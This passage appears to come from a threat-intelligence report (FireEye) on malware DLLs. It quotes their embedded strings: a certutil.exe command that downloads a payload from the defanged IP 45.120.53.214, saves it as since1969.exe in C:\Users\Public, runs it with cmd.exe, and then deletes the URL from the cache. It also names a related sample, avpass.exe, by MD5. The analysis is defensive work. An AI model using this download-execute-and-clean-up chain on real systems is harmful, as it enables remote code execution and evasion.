@@ -1,0 +1,7 @@
+
+Execute the downloaded binary since1969.exe , located in C:\\Users\\Public .
+Delete the URL from the current user’s certificate cache.
+certutil.exe -urlcache -split -f hxxp://45.120.53[.]214/patch32 C:/Users/Public/since1969.exe cmd.exe /c
+C:/Users/Public/since1969.exe certutil -urlcache -f hxxp://45.120.53[.]214/patch32 delete Figure 5: Snippet of strings from x86.dll certutil.exe -urlcache -split -f hxxp://45.120.53[.]214/patch64 C:/Users/Public/since1969.exe cmd.exe /c
+C:/Users/Public/since1969.exe certutil -urlcache -f hxxp://45.120.53[.]214/patch64 delete Figure 6: Snippet of strings from x64.dll
+Although neither patch32 nor patch64 were available at the time of analysis, FireEye identified a file on VirusTotal with the name avpass.exe (MD5: e345c861058a18510e7c4bb616e3fd9f) linked to the IP address 45[.]120[.]53[.]214 (Figure 8).
